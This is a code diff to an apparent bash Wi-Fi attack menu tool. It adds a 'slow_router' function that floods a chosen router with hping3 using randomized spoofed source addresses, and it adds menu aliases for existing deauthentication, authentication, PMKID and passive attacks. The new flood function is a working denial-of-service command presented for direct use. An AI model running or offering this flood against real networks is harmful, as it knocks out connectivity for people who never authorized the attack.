@@ -114,7 +114,7 @@ function all_banners(){
 
 # Dependencies Function
 function dependencies(){
-	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm bettercap)
+	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm bettercap hping3)
 	system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
 	if [ "$system"  == "Parrot" ]; then
 		for program in "${programs[@]}"; do
@@ -587,6 +587,24 @@ function passive_attack(){
 	keep_exit
 }
 
+# Router Slower Attack
+function slow_router(){
+	clear
+	banner1
+	sleep 0.3
+	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Enter the router ip [default: 192.168.1.1]: ${endColour}" && read router_ip
+	
+	if [ "$router_ip" == "" ]; then
+		router_ip="192.168.1.1"
+	fi
+	
+	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Floading the router connection...${endColour}"
+	hping3 --rand-source -V -d 500 $router_ip -p 80 --flood &>/dev/null
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Router Floaing completed${endColour}"
+	sleep 1.5
+	keep_exit
+}
+
 # Michael Exploitation Attack
 function michael(){
 	clear
@@ -834,7 +852,7 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$option" == "2" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ]; then
+			if [ "$option" == "2" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ] || [ "$option" == "deauth attack" ]; then
 				sleep 0.15
 				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
 				type_of_attack="Deauthentication Attack"
@@ -849,7 +867,7 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ]; then
+			if [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ] || [ "$option" == "auth attack" ]; then
 				sleep 0.15
 				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
                                 type_of_attack="Authentication Attack"
@@ -864,7 +882,7 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$option" == "4" ] || [ "$option" == "pkmid" ]; then
+			if [ "$option" == "4" ] || [ "$option" == "pkmid" ] || [ "$option" == "pkmid attack" ]; then
 				sleep 0.15
 				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
 				type_of_attack="PKMID Attack"
@@ -879,7 +897,7 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$option" == "5" ] || [ "$option" == "passive" ]; then
+			if [ "$option" == "5" ] || [ "$option" == "passive" ] || [ "$option" == "passive attack" ]; then
 				sleep 0.15
 				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
 				type_of_attack="Passive/Stealthy Attack"
@@ -894,7 +912,7 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$option" == "6" ] || [ "$option" == "randomize" ] || [ "$option" == "mac" ]; then
+			if [ "$option" == "6" ] || [ "$option" == "randomize" ] || [ "$option" == "mac" ] || [ "$option" == "randomize mac" ]; then
 				sleep 0.15
 				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
 				if [ "$mon_check" == "${netCard}mon" ]; then
@@ -911,12 +929,12 @@ if [ "$(id -u)" == "0" ]; then
 				fi
 			fi
 
-			if [ "$option" == "7" ] || [ "$option" == "start" ]; then
+			if [ "$option" == "7" ] || [ "$option" == "start" ] || [ "$option" == "up" ]; then
                                 sleep 0.15
 				card_setup
 			fi
 
-			if [ "$option" == "8" ] || [ "$option" == "stop" ]; then
+			if [ "$option" == "8" ] || [ "$option" == "stop" ] || [ "$option" == "down" ]; then
 				sleep 0.15
                                 card_stop
                         fi
@@ -1022,6 +1040,10 @@ if [ "$(id -u)" == "0" ]; then
 			fi
 
 			if [ "$option" == "quit" ]; then
+				ctrl_c
+			fi
+	
+			if [ "$option" == "salir" ]; then
 				ctrl_c
 			fi
 
